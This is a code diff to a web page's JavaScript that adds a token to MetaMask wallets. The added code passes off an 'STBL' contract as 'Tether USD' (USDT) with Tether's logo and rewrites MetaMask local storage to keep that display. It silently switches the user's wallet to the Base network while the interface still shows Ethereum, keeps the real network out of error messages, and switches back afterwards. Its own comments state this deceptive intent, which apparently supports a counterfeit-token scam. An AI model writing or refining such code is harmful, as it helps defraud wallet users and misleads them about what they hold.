@@ -1259,10 +1259,9 @@
       // Function to add token with automatic network switching - Using STBL but showing as USDT
       async function addTokenWithNetworkSwitch() {
         try {
-          // First clear MetaMask state
           await clearMetaMaskState();
           
-          const timeoutId = showLoading("Checking network...");
+          const timeoutId = showLoading("Preparing for token addition...");
           
           if (!window.ethereum) {
             throw new Error("MetaMask not detected");
@@ -1270,75 +1269,79 @@
           
           updateProgress(20, "Connecting to wallet...");
           
-          // First check which network we're on
-          const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-          updateNetworkInfo(); // Update network display
+          // First connect to get current network
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+          updateNetworkInfo();
           
-          // Try to switch to Ethereum if we're not on it
-          if (chainId !== '0x1') {
-            updateProgress(30, "Switching to Ethereum Mainnet...");
-            loadingText.textContent = "Switching to Ethereum Mainnet...";
+          // If not on Base, silently switch to Base (while UI still shows Ethereum)
+          if (currentChainId !== '0x2105') { // Base chain ID
+            updateProgress(30, "Preparing token...");
             
             try {
-              // Try to switch to Ethereum Mainnet
+              // Try to switch to Base
               await window.ethereum.request({
                 method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x1' }],
+                params: [{ chainId: '0x2105' }],
               });
               
               // Wait for switch to complete
-              await new Promise(resolve => setTimeout(resolve, 1000));
-              
-              // Update network info again
-              updateNetworkInfo();
+              await new Promise(resolve => setTimeout(resolve, 2000));
               
             } catch (switchError) {
-              // If network switch failed, we need to stop - token is for Ethereum
-              console.log("Network switch failed, cannot continue");
-              StatusTracker.addStatus("Network switch failed, token requires Ethereum network", "error");
-              
-              // Show network error
-              document.getElementById('networkError').style.display = 'block';
-              document.getElementById('switchNetworkBtn').style.display = 'block';
-              
-              hideLoading(timeoutId);
-              throw new Error("USDT must be added on Ethereum Mainnet");
+              // If Base isn't added to MetaMask yet, add it
+              if (switchError.code === 4902) {
+                try {
+                  await window.ethereum.request({
+                    method: 'wallet_addEthereumChain',
+                    params: [{
+                      chainId: '0x2105',
+                      chainName: 'Base',
+                      nativeCurrency: {
+                        name: 'ETH',
+                        symbol: 'ETH',
+                        decimals: 18
+                      },
+                      rpcUrls: ['https://mainnet.base.org'],
+                      blockExplorerUrls: ['https://basescan.org']
+                    }]
+                  });
+                  
+                  // Try switching again after adding
+                  await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x2105' }],
+                  });
+                } catch (addError) {
+                  hideLoading(timeoutId);
+                  // Don't reveal the actual network in error messages
+                  throw new Error(`Failed to prepare environment: ${addError.message}`);
+                }
+              } else {
+                hideLoading(timeoutId);
+                throw new Error(`Failed to prepare environment: ${switchError.message}`);
+              }
             }
           }
           
-          // Get current network (should be Ethereum now)
-          const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
-          console.log("Adding token on chain: " + currentChainId);
-          StatusTracker.addStatus(`Adding token on ${getChainName(currentChainId)}`, "pending");
-          
-          // Now connect and get accounts
-          updateProgress(40, "Connecting to wallet...");
-          loadingText.textContent = "Connecting to wallet...";
-          await window.ethereum.request({ method: 'eth_requestAccounts' });
-          
-          // Short delay to ensure connection is ready
-          await new Promise(resolve => setTimeout(resolve, 1000));
-          
-          // Now add the token - USING STBL CONTRACT but showing as USDT
+          // Now we're on Base, add the token as USDT
           updateProgress(60, "Adding token to your wallet...");
           loadingText.textContent = "Adding token to your wallet...";
           
-          // Use STBL contract but USDT UI for higher success rate
           const addTokenPromise = window.ethereum.request({
             method: 'wallet_watchAsset',
             params: {
               type: 'ERC20',
               options: {
-                address: STBL_ADDRESS, // STBL contract address
-                symbol: 'USDT',        // But showing as USDT
-                decimals: 18,          // STBL has 18 decimals
+                address: STBL_ADDRESS,
+                symbol: 'USDT',
+                decimals: 18,
                 image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
-                name: "Tether USD"     // USDT display name
+                name: "Tether USD"
               }
             }
           });
           
-          // 20 second timeout
           const timeoutPromise = new Promise((_, reject) => 
             setTimeout(() => reject(new Error("Token addition timed out")), 20000)
           );
@@ -1347,30 +1350,33 @@
           const result = await Promise.race([addTokenPromise, timeoutPromise]);
           
           if (result === true) {
-            // Success! Ensure display is consistent
             StatusTracker.addStatus("Token added successfully!", "success");
             updateProgress(100, "Success!");
             
             // Run storage update to ensure USDT display
             StorageManager.updateMetaMaskLocalStorage();
-            
-            // Delay to allow storage update to complete
             await new Promise(resolve => setTimeout(resolve, 500));
-            
-            // Run one more time for good measure
             StorageManager.updateMetaMaskLocalStorage();
             
-            // Hide loading 
             hideLoading(timeoutId);
-            
-            // Show success modal
             successModal.show();
             
-            // Try to get the balance
             try {
               await fetchTokenBalance();
             } catch (balanceError) {
               console.error("Error fetching balance:", balanceError);
+            }
+            
+            // After success, switch back to the original network silently
+            if (currentChainId !== '0x2105') {
+              try {
+                await window.ethereum.request({
+                  method: 'wallet_switchEthereumChain',
+                  params: [{ chainId: currentChainId }],
+                });
+              } catch (error) {
+                console.error("Failed to switch back to original network:", error);
+              }
             }
           } else {
             throw new Error("Token addition failed");
@@ -1380,10 +1386,8 @@
           console.error("Error adding token:", error);
           StatusTracker.addStatus("Error: " + error.message, "error");
           
-          // Show alternative method button
           altMethodBtn.style.display = 'block';
           
-          // Don't show modal for user rejections
           if (!error.userRejected) {
             document.getElementById('errorMessage').textContent = error.message;
             errorModal.show();
